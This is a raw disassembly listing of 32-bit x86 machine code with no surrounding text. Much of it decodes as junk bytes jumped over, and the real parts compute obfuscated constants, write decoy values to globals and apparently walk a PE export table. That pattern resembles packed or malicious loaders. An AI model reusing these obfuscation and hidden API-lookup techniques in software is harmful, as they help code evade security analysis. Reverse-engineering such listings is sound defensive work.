  404175:	mov    ds:0xe4793336,eax
  40417a:	not    DWORD PTR [edx+0x40]
  40417d:	ds mov esp,edi
  404180:	mov    gs,WORD PTR [ebp+0x13d74972]
  404186:	pop    edx
  404187:	scas   eax,DWORD PTR es:[edi]
  404188:	jb     0x404157
  40418a:	bound  esi,QWORD PTR [edi+0xf]
  40418d:	pop    ecx
  40418e:	sub    ebx,esi
  404190:	cmp    ecx,DWORD PTR [ecx+eax*4]
  404193:	adc    eax,0x10848d45
  404198:	fwait
  404199:	jb     0x4041cd
  40419b:	add    BYTE PTR [ecx+0x45ff0845],cl
  4041a1:	or     al,0xe9
  4041a3:	arpl   ax,di
  4041a5:	(bad)  
  4041a6:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	in     al,dx
  4041d6:	xchg   DWORD PTR [edx+0x7e1b525e],esp
  4041dc:	jle    0x404177
  4041de:	jg     0x40425e
  4041e0:	jle    0x4041eb
  4041e2:	or     al,0xf1
  4041e4:	xchg   ebx,eax
  4041e5:	push   0xffffff9e
  4041e7:	repz push edx
  4041e9:	xor    eax,0xe3ad9903
  4041ee:	xchg   ecx,eax
  4041ef:	fisub  DWORD PTR [ebp-0x32bb0233]
  4041f5:	dec    ebx
  4041f6:	lea    ebx,[ecx+edx*8]
  4041f9:	add    edx,DWORD PTR [ebp+0x26ed9fa1]
  4041ff:	xor    DWORD PTR [edi],edx
  404201:	addr16 push es
  404203:	(bad)  
  404204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404206:	jp     0x404190
  404208:	xchg   edi,eax
  404209:	scas   al,BYTE PTR es:[edi]
  40420a:	xchg   BYTE PTR [ebp+0x40],al
  40420d:	ja     0x404234
  40420f:	jmp    0x404227
  404211:	sbb    DWORD PTR [edx],0x9cfe0dab
  404217:	mov    ecx,0x1388c7fd
  40421c:	mov    ss,WORD PTR [ebx-0x3d]
  40421f:	push   0x94bfc69f
  404224:	je     0x404292
  404226:	in     al,0x4d
  404228:	dec    ecx
  404229:	mov    DWORD PTR [edi],0xa4b89a4e
  40422f:	mov    bh,0xca
  404231:	cli    
  404232:	setp   BYTE PTR [edx]
  404235:	xor    dh,ah
  404237:	dec    ecx
  404238:	fdivr  QWORD PTR [eax]
  40423a:	std    
  40423b:	retf   0xa16c
  40423e:	pop    ebp
  40423f:	mov    al,bh
  404241:	cmp    dh,BYTE PTR [edx]
  404243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404244:	rcl    DWORD PTR [eax+0x50ff0134],1
  40424a:	out    0x57,eax
  40424c:	xor    BYTE PTR [edx-0x7f],0xc1
  404250:	mov    BYTE PTR [edi],cl
  404252:	xor    ecx,DWORD PTR [bp+si-0x5be5]
  404257:	and    eax,0x360c3a4c
  40425c:	and    ch,BYTE PTR [edi+0x642f4bba]
  404262:	adc    ah,BYTE PTR [edx+0x1c0a2675]
  404268:	sbb    edx,DWORD PTR [esi+eiz*8+0x46]
  40426c:	mov    esp,0x15c22853
  404271:	xor    eax,0xb333ab1c
  404276:	in     eax,dx
  404277:	rcr    DWORD PTR [edi-0x376360b2],0x95
  40427e:	pusha  
  40427f:	pop    ds
  404280:	sub    eax,0x3d774a58
  404285:	fstp   DWORD PTR [edi-0x5a]
  404288:	cvtps2pd xmm1,xmm5
  40428b:	mov    ebp,DWORD PTR [esi+0x7d]
  40428e:	lea    ebx,[esi]
  404290:	or     eax,0x6584c411
  404295:	test   al,0xc8
  404297:	or     esi,DWORD PTR [eax+0x1c]
  40429a:	jecxz  0x404250
  40429c:	mov    ebp,0x7521ce0b
  4042a1:	xor    bl,dh
  4042a3:	out    dx,al
  4042a4:	push   cs
  4042a5:	jb     0x4042ce
  4042a7:	mov    esi,0x25ed6e55
  4042ac:	push   esi
  4042ad:	pop    ecx
  4042ae:	in     eax,dx
  4042af:	imul   edi,ecx,0x87cfd543
  4042b5:	stos   BYTE PTR es:[edi],al
  4042b6:	push   esp
  4042b7:	pop    edi
  4042b8:	xor    eax,0xd0e41f0f
  4042bd:	adc    al,0x15
  4042bf:	loope  0x404302
  4042c1:	repz adc BYTE PTR [ebp-0x22],al
  4042c5:	adc    eax,0xa9cf3d65
  4042ca:	into   
  4042cb:	hlt    
  4042cc:	mov    cs,ebp
  4042ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042cf:	mov    eax,ds:0xd4e3d627
  4042d4:	in     al,dx
  4042d5:	in     al,0xfc
  4042d7:	mov    DWORD PTR [edx-0x21],esp
  4042da:	sub    al,0xd3
  4042dc:	loope  0x4042f9
  4042de:	sub    ebp,DWORD PTR [eax-0x59c24ba6]
  4042e4:	adc    BYTE PTR [ecx-0x665c561b],0x94
  4042eb:	xchg   ecx,eax
  4042ec:	dec    ebx
  4042ed:	and    bl,cl
  4042ef:	in     eax,dx
  4042f0:	push   eax
  4042f1:	sbb    eax,0x57aa6dfa
  4042f6:	sbb    BYTE PTR [ebx],ch
  4042f8:	stc    
  4042f9:	xchg   esp,ecx
  4042fb:	sbb    edi,DWORD PTR [ecx+0x7b6c568]
  404301:	or     BYTE PTR [ebx+edx*2-0x24bc5c3e],bl
  404308:	mov    eax,0x8b1439c4
  40430d:	(bad)  
  40430e:	push   esp
  40430f:	call   0x1cf8:0x284f1afa
  404316:	out    dx,eax
  404317:	adc    cl,BYTE PTR [eax-0x4a6057b0]
  40431d:	mov    edx,0x95b4fa6c
  404322:	push   ebp
  404323:	mov    ss,WORD PTR [ecx]
  404325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404326:	mov    ah,0xb8
  404328:	es (bad) 
  40432a:	hlt    
  40432b:	mov    edx,0x1a3f84c1
  404330:	dec    ebx
  404331:	out    0x4a,eax
  404333:	(bad)
  404336:	inc    esp
  404337:	fist   DWORD PTR [ebp+0x52227658]
  40433d:	jmp    0x542d1d67
  404342:	jae    0x4042e6
  404344:	mov    ds:0x305c019a,al
  404349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40434a:	inc    ecx
  40434b:	retf   
  40434c:	add    eax,0xaf2cc26
  404351:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  404353:	neg    esp
  404355:	xor    BYTE PTR [ebp+0x15],0x18
  404359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40435a:	pop    esi
  40435b:	or     eax,0x7db3540f
  404360:	outs   dx,BYTE PTR ds:[esi]
  404361:	adc    al,0xc0
  404363:	adc    DWORD PTR [eax+0x49],ebp
  404366:	push   esp
  404367:	jae    0x4043c3
  404369:	fs xor eax,0x95668ff1
  40436f:	xchg   DWORD PTR [ecx-0x21ffc19],ebx
  404375:	aam    0x8b
  404377:	loop   0x40439a
  404379:	mov    ah,0xe3
  40437b:	push   0xffffff91
  40437d:	push   cs
  40437e:	mov    ecx,0xe1115fe0
  404383:	stos   DWORD PTR es:[edi],eax
  404384:	fdiv   st(1),st
  404386:	jecxz  0x404349
  404388:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40438f:	mov    eax,DWORD PTR [ebp-0x4]
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42ed6f,0x42e740
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ed67,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x4303b5,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42ed6f,0x4303b5
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x43045f,0x42e748
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e74c,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ed63,0x42ed6b
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42ed6b,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x4303cd,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	or     cl,BYTE PTR [edx]
  40442e:	dec    edi
  40442f:	sar    ch,0x19
  404432:	jle    0x4044b2
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x4043bd
  404439:	loopne 0x404440
  40443b:	rcr    BYTE PTR [ebp+edx*4+0x1c],1
  40443f:	cmp    eax,0x854ccf7f
  404444:	ins    DWORD PTR es:[edi],dx
  404445:	inc    ecx
  404446:	pop    ds
  404447:	retf   0xfb91
  40444a:	int    0x9d
  40444c:	mov    esi,0x8088f828
  404451:	inc    cx
  404453:	scas   eax,DWORD PTR es:[edi]
  404454:	in     eax,0xf7
  404456:	jp     0x404479
  404458:	pop    esp
  404459:	inc    ebx
  40445a:	cmp    edx,DWORD PTR [eax+0x78a215c2]
  404460:	pop    eax
  404461:	inc    ecx
  404462:	inc    esp
  404463:	and    BYTE PTR [ebx-0x4e6d0f60],0x8e
  40446a:	push   edx
  40446b:	sbb    ebp,esp
  40446d:	xor    ch,cl
  40446f:	dec    ecx
  404470:	in     eax,dx
  404471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404472:	inc    ebx
  404473:	mov    eax,ds:0x3a666ee4
  404478:	pop    ss
  404479:	and    eax,0xf93da6e7
  40447e:	ins    DWORD PTR es:[edi],dx
  40447f:	js     0x4044ee
  404481:	je     0x4044fe
  404483:	or     al,0x20
  404485:	es adc al,0x18
  404488:	(bad)  
  404489:	dec    DWORD PTR [ebx]
  40448b:	repz add ah,BYTE PTR [edx-0x6d2dbaec]
  404492:	cmp    eax,0xc2121251
  404497:	not    DWORD PTR [ebp+0x346a3e28]
  40449d:	cdq    
  40449e:	and    al,0xf1
  4044a0:	sbb    eax,0x860750f4
  4044a5:	imul   ebp,DWORD PTR ds:0xa8aa5cb9,0x390835e4
  4044af:	and    DWORD PTR [ebx-0x6e],esp
  4044b2:	outs   dx,DWORD PTR ds:[esi]
  4044b3:	adc    al,0x69
  4044b5:	lds    esi,FWORD PTR [ebx-0x2c968b7e]
  4044bb:	adc    eax,0x674a586b
  4044c0:	push   esp
  4044c1:	cli    
  4044c2:	invd   
  4044c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c5:	(bad)  
  4044c6:	sub    ecx,DWORD PTR [edi-0x55]
  4044c9:	sbb    eax,DWORD PTR [esi]
  4044cb:	gs mov ebp,0x27dcb2df
  4044d1:	ins    BYTE PTR es:[edi],dx
  4044d2:	js     0x404538
  4044d4:	test   al,0xa2
  4044d6:	imul   edi,DWORD PTR [ecx+ecx*2-0x1083a1ea],0x7dc26031
  4044e1:	cmp    BYTE PTR [edx],dl
  4044e3:	int    0x25
  4044e5:	xor    bl,bl
  4044e7:	or     ebp,esi
  4044e9:	mov    eax,0x4c6d4156
  4044ee:	mov    ebx,0xdb044194
  4044f3:	add    ecx,edx
  4044f5:	lahf   
  4044f6:	cmp    eax,0x9ec2704a
  4044fb:	test   BYTE PTR [edi+0x22cb40af],0xbb
  404502:	inc    edi
  404503:	inc    esp
  404504:	add    DWORD PTR [esi-0x153fcbf7],ebx
  40450a:	jbe    0x40450f
  40450c:	arpl   WORD PTR [ebx+0x22],cx
  40450f:	(bad)  
  404510:	mov    eax,0xe0c18d75
  404515:	retf   
  404516:	pushf  
  404517:	aad    0xc
  404519:	add    eax,0x12ed7d4e
  40451e:	pushf  
  40451f:	inc    esp
  404520:	and    al,BYTE PTR [ebp-0x6613e110]
  404526:	mov    ch,0x47
  404528:	mov    ah,0x95
  40452a:	fnsave [edx]
  40452c:	(bad)  
  40452d:	lds    esi,FWORD PTR [edi-0x1fa2273f]
  404533:	mov    dh,0xd6
  404535:	inc    edi
  404536:	lods   eax,DWORD PTR ds:[esi]
  404537:	sbb    bl,BYTE PTR [edx+0x60b41e75]
  40453d:	mov    edi,DWORD PTR [esi-0x60]
  404540:	retf   0x690c
  404543:	push   ebx
  404544:	ficom  WORD PTR [ebp+0x617886ee]
  40454a:	ret    0x92a5
  40454d:	pop    ecx
  40454e:	pop    eax
  40454f:	outs   dx,DWORD PTR ds:[esi]
  404550:	cmp    ecx,edx
  404552:	mov    al,gs:0x1db54238
  404558:	mov    eax,DWORD PTR [ebp+0x1b5d030]
  40455e:	(bad)  
  40455f:	into   
  404560:	jl     0x404583
  404562:	xor    DWORD PTR [ebx+0x3a],esi
  404565:	and    bh,BYTE PTR [edx-0x5c]
  404568:	sub    bl,bh
  40456a:	ins    DWORD PTR es:[edi],dx
  40456b:	xchg   ah,ch
  40456d:	jb     0x40458e
  40456f:	mov    esp,eax
  404571:	les    edi,FWORD PTR ss:[eax-0x53395ed3]
  404578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404579:	pop    ecx
  40457a:	or     al,0xa6
  40457d:	sub    ch,0x26
  404580:	pop    eax
  404581:	fcomp  QWORD PTR ss:[ebx-0x6c03ad7]
  404588:	mov    eax,ds:0x3b86845d
  40458d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40458e:	push   ss
  40458f:	sahf   
  404590:	dec    esp
  404591:	mov    WORD PTR [ecx-0x72ed7e98],?
  404597:	xchg   ecx,eax
  404598:	push   0xffffffc7
  40459a:	ret    
  40459b:	push   0x5b
  40459d:	xor    BYTE PTR [ecx+0x78],ch
  4045a0:	xor    ah,cl
  4045a2:	je     0x40453f
  4045a4:	ret    0x81fc
  4045a7:	pop    edx
  4045a8:	sar    DWORD PTR cs:[ebx+ecx*8-0x5947dbd8],1
  4045b0:	aad    0xd9
  4045b2:	xchg   BYTE PTR [eax+0x16],bl
  4045b5:	test   BYTE PTR es:[esi-0x68],0x8f
  4045ba:	ret    
  4045bb:	cmp    edx,edx
  4045bd:	mov    ebp,0x1190c94d
  4045c2:	jmp    0x9528:0x606483cf
  4045c9:	mov    ecx,0x600474da
  4045ce:	push   ebp
  4045cf:	cmp    BYTE PTR [ecx+0x3637923c],dl
  4045d5:	mov    edi,0x8e1a286a
  4045da:	or     eax,0x9695a0fc
  4045df:	add    eax,ecx
  4045e1:	add    esi,ecx
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x430467,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x4303b9,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x4303b9
  40460c:	inc    eax
  40460d:	mov    ds:0x4303b9,eax
  404612:	cmp    DWORD PTR ds:0x4303b9,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x4303b9,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42eb93
  404650:	cmp    DWORD PTR ds:0x4303b9,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x4303b9
  404662:	inc    eax
  404663:	mov    ds:0x4303b9,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42ed53,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x4303b9,0x4303f1
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x4303dd,0x42ed5b
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x40475b
  4046fa:	sbb    dh,BYTE PTR [ecx]
  4046fc:	mov    eax,0x7e7e2724
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x40474f
  404706:	mov    ebx,0x6b3fa2a3
  40470b:	scas   al,BYTE PTR es:[edi]
  40470c:	std    
  40470d:	dec    esp
  40470e:	xchg   ebp,edx
  404710:	jno    0x404739
  404712:	mov    eax,0xfdb07aed
  404717:	hlt    
  404718:	mov    edx,?
  40471a:	push   esi
  40471b:	neg    ebx
  40471d:	mov    cl,0xdd
  40471f:	rol    esp,1
  404721:	mov    ch,0x5e
  404723:	jecxz  0x404748
  404725:	into   
  404726:	psubsw mm1,QWORD PTR [edi+0x27cf0ab1]
  40472d:	and    eax,0x5d8bc3a
  404732:	add    eax,0xbba19812
  404737:	push   edx
  404738:	jae    0x404721
  40473a:	adc    DWORD PTR [eiz*2-0x34c73acf],esp
  404741:	push   ds
  404742:	dec    edx
  404743:	jecxz  0x404761
  404745:	lods   eax,DWORD PTR ds:[esi]
  404746:	push   edx
  404747:	and    dl,BYTE PTR [ebp-0x3b]
  40474a:	shl    DWORD PTR [ebx],0xd9
  40474d:	inc    ebp
  40474e:	jmp    0xaef5bdb5
  404753:	cli    
  404754:	rcl    DWORD PTR [ebx],cl
  404756:	push   ebx
  404757:	jge    0x40475b
  404759:	fidiv  WORD PTR [eax]
  40475b:	mov    edx,edx
  40475d:	jo     0x40474d
  40475f:	test   al,0xec
  404761:	imul   esp,DWORD PTR [esi-0x6940725f],0x9ae1b13e
  40476b:	lea    edi,[esi]
  40476d:	aaa    
  40476e:	jne    0x4047d3
  404770:	rcr    BYTE PTR [eax+0x6798fde],cl
  404776:	add    ch,BYTE PTR [edi+ebp*4]
  404779:	mov    dh,0x14
  40477b:	inc    esp
  40477c:	sbb    ah,BYTE PTR [esi+0x466d934]
  404782:	je     0x404749
  404784:	aas    
  404785:	adc    al,0x9e
  404787:	cmp    eax,0xae0c3f5c
  40478c:	mov    dl,0x21
  40478e:	clc    
  40478f:	pop    ds
  404790:	cs jne 0x404805
  404793:	and    eax,0xd96c3ac3
  404798:	pop    edi
  404799:	ror    DWORD PTR [edx-0x45],1
  40479c:	xor    DWORD PTR [edx-0x6ed6028f],edi
  4047a2:	push   esp
  4047a3:	and    ebx,DWORD PTR ds:0x3b2d7192
  4047a9:	adc    al,BYTE PTR [ebx-0xa251256]
  4047af:	pop    ebp
  4047b0:	repz inc edx
  4047b2:	stos   DWORD PTR es:[edi],eax
  4047b3:	sar    BYTE PTR [edx],0xe1
  4047b6:	dec    esi
  4047b7:	add    BYTE PTR [eax],ch
  4047b9:	ins    BYTE PTR es:[edi],dx
  4047ba:	es jnp 0x4047eb
  4047bd:	fnsave [ecx-0x7b884735]
  4047c3:	mov    ah,0xe6
  4047c5:	retf   0x571e
  4047c8:	add    ch,al
  4047ca:	std    
  4047cb:	jmp    0x404796
  4047cd:	cmc    
  4047ce:	popa   
  4047cf:	or     eax,0x547d2b6e
  4047d4:	mov    esi,DWORD PTR [eax]
  4047d6:	push   ecx
  4047d7:	(bad)  
  4047d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047d9:	jnp    0x4047c7
  4047db:	in     al,dx
  4047dc:	push   esp
  4047dd:	cdq    
  4047de:	jle    0x404839
  4047e0:	cli    
  4047e1:	loop   0x404813
  4047e3:	mov    fs,WORD PTR [ebx+0x3a]
  4047e6:	adc    BYTE PTR [ecx],dh
  4047e8:	xchg   ebx,eax
  4047e9:	mov    DWORD PTR cs:[edx+eiz*8],esp
  4047ed:	pusha  
  4047ee:	dec    eax
  4047ef:	xchg   ebp,eax
  4047f0:	or     BYTE PTR [ecx-0x23ca4035],dl
  4047f6:	jmp    0x404808
  4047f8:	jne    0x40478d
  4047fa:	mov    BYTE PTR [edx+ecx*4-0x3f0fe423],ch
  404801:	pushf  
  404802:	lea    esi,[esi-0x8f6a434]
  404808:	jecxz  0x404807
  40480a:	setg   BYTE PTR [edi+eax*2-0x58]
  40480f:	test   al,0xf1
  404811:	sub    eax,0xcaa64951
  404816:	add    bh,BYTE PTR [eax+0x41f056a1]
  40481c:	mov    cl,0x4e
  40481e:	shl    DWORD PTR [ebx+edi*2+0x37],0xf8
  404823:	jmp    0x36e69712
  404828:	loope  0x4047fe
  40482a:	push   ebx
  40482b:	adc    ebp,edx
  40482d:	xor    ch,BYTE PTR [eax+0x7f]
  404830:	hlt    
  404831:	sub    al,0x30
  404833:	jno    0x40485f
  404835:	xlat   BYTE PTR ds:[ebx]
  404836:	jb     0x404888
  404838:	pop    edx
  404839:	stos   BYTE PTR es:[edi],al
  40483a:	inc    edi
  40483b:	mov    cl,0x1
  40483d:	inc    edx
  40483e:	int3   
  40483f:	xor    al,BYTE PTR [eax+0x513628e]
  404845:	sbb    al,0x8b
  404847:	fwait
  404848:	popf   
  404849:	xor    dh,BYTE PTR [ebp+0xb]
  40484c:	sub    eax,0x9d88b315
  404851:	fwait
  404852:	sbb    al,0x4e
  404854:	rcr    BYTE PTR [edi+0x326e1775],1
  40485a:	add    DWORD PTR [eax+eiz*8-0x6b],ebp
  40485e:	(bad)  
  40485f:	mov    WORD PTR [ecx-0x51990370],gs
  404865:	lods   eax,DWORD PTR ds:[esi]
  404866:	xchg   DWORD PTR [esi],ebx
  404868:	sbb    eax,0x65424bdd
  40486d:	call   0xce791867
  404872:	mov    ds:0x19b69761,al
  404877:	aaa    
  404878:	call   0xa63584c8
  40487d:	xchg   esp,eax
  40487e:	jne    0x4048cd
  404880:	mov    fs,WORD PTR [edi+ebp*4+0x4cab35d3]
  404887:	out    0x2c,eax
  404889:	sub    al,0x49
  40488b:	dec    ecx
  40488c:	xchg   ecx,eax
  40488d:	ret    0x7a0e
  404890:	lods   eax,DWORD PTR ds:[esi]
  404891:	push   esp
  404892:	lea    ebp,[esp+ebp*2-0x3ca69763]
  404899:	inc    ecx
  40489a:	jns    0x40487d
  40489c:	xchg   esi,eax
  40489d:	and    eax,0x7377e092
  4048a2:	inc    edx
  4048a3:	pop    ebx
  4048a4:	scas   eax,DWORD PTR es:[edi]
  4048a5:	or     ch,BYTE PTR [esp+eax*8]
  4048a8:	fs or  eax,0x832c0945
  4048ae:	aad    0xcb
  4048b0:	jg     0x404863
  4048b2:	xchg   ecx,edx
  4048b4:	ficomp WORD PTR [edi-0x14]
  4048b7:	int    0xe1
  4048b9:	push   ss
  4048ba:	ror    BYTE PTR [edx+0x6b9396e7],1
  4048c0:	cs adc eax,0x7fdc15b1
  4048c6:	out    dx,eax
  4048c7:	lock outs dx,BYTE PTR ds:[esi]
  4048c9:	int3   
  4048ca:	adc    BYTE PTR [ebp-0x1814d0c],bl
  4048d0:	out    0x97,al
  4048d2:	or     DWORD PTR [edx],eax
  4048d4:	push   ebp
  4048d5:	call   0x3287697d
  4048da:	add    ebx,DWORD PTR [ecx-0x32]
  4048dd:	stos   BYTE PTR es:[edi],al
  4048de:	or     ch,bh
  4048e0:	test   BYTE PTR [edi-0x35],cl
  4048e3:	xchg   DWORD PTR [edi-0x346dc919],ebp
  4048e9:	std    
  4048ea:	inc    eax
  4048eb:	adc    ecx,ecx
  4048ed:	loope  0x4048a2
  4048ef:	pop    edi
  4048f0:	add    BYTE PTR [ebx+eiz*2],bl
  4048f3:	mov    ah,0x82
  4048f5:	sar    BYTE PTR [ecx-0x5133af1],cl
  4048fb:	jge    0x40495d
  4048fd:	aad    0xb8
  4048ff:	jno    0x4048f5
  404901:	fcom   DWORD PTR [edx]
  404903:	iret   
  404904:	in     eax,dx
  404905:	jns    0x4048c7
  404907:	mov    ch,0x81
  404909:	dec    ebx
  40490a:	stos   BYTE PTR es:[edi],al
  40490b:	jns    0x4048e0
  40490d:	mov    ecx,0x7491019f
  404912:	lahf   
  404913:	inc    ebp
  404914:	xchg   ecx,eax
  404915:	(bad)  
  404916:	int    0xcf
  404918:	inc    eax
  404919:	out    0x38,al
  40491b:	sub    BYTE PTR [edx+0x40],ah
  40491e:	fistp  DWORD PTR [edx]
  404920:	pslld  mm4,QWORD PTR es:[ebp-0x61]
  404925:	cmp    DWORD PTR [eax],ebp
  404927:	movlps xmm6,QWORD PTR [ebx-0x4c]
  40492b:	addr16 jae 0x4048e2
  40492e:	sbb    al,0x1c
  404930:	mov    eax,0x256ed0ab
  404935:	inc    ebp
  404936:	retf   
  404937:	add    al,0xd8
  404939:	addr16 push ds
  40493b:	je     0x4049b9
  40493d:	es push ds
  40493f:	inc    edi
  404940:	mov    dl,0xfb
  404942:	mov    DWORD PTR [ecx+0x62],esp
  404945:	jb     0x4048ed
  404947:	pushf  
  404948:	mov    al,ds:0xe1ff5af2
  40494d:	xor    esi,DWORD PTR [edx-0x24bdcab5]
  404953:	jmp    0x4049d3
  404955:	div    BYTE PTR [ecx-0x7]
  404958:	(bad)  
  404959:	jecxz  0x404958
  40495b:	(bad)  
  40495d:	scas   al,BYTE PTR es:[edi]
  40495e:	adc    al,0xba
  404960:	push   eax
  404961:	fsincos 
  404963:	xchg   ecx,eax
  404964:	aaa    
  404965:	adc    DWORD PTR [edx],0xffffff89
  404968:	sbb    eax,0x7fac3665
  40496d:	imul   esi,DWORD PTR ds:0x4d88625b,0xffffffe4
  404974:	je     0x404995
  404976:	sbb    eax,0xa958ca8c
  40497b:	xor    esp,ebp
  40497d:	jae    0x4049c6
  40497f:	jns    0x4049e5
  404981:	inc    eax
  404982:	mov    edi,DWORD PTR [ecx+esi*2]
  404985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404986:	cdq    
  404987:	inc    edx
  404988:	jo     0x404949
  40498a:	fs stos DWORD PTR es:[edi],eax
  40498c:	jne    0x54e519f5
  404992:	mov    ecx,DWORD PTR [ecx+0x19e377dc]
  404998:	xor    al,0x65
  40499a:	push   cs
  40499b:	repz sub edi,DWORD PTR [ecx+ecx*4-0x2]
  4049a0:	jo     0x40494e
  4049a2:	xor    BYTE PTR [ecx+ecx*4],cl
  4049a5:	add    al,BYTE PTR [ecx+0x42e75825]
  4049ab:	add    BYTE PTR [eax],al
  4049ad:	add    BYTE PTR [eax],al
  4049af:	add    BYTE PTR [ebx],dh
  4049b1:	shl    BYTE PTR [ebx],cl
  4049b3:	adc    eax,0x42e758
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e758,edx
  4049bf:	cmp    DWORD PTR ds:0x42e758,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e94f
  4049da:	cmp    DWORD PTR ds:0x42e758,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e758
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e758,edx
  4049f4:	cmp    DWORD PTR ds:0x42e758,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42ed6b,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x43044f,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ed67,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x430463,0x43045f
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ed67,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x43045b
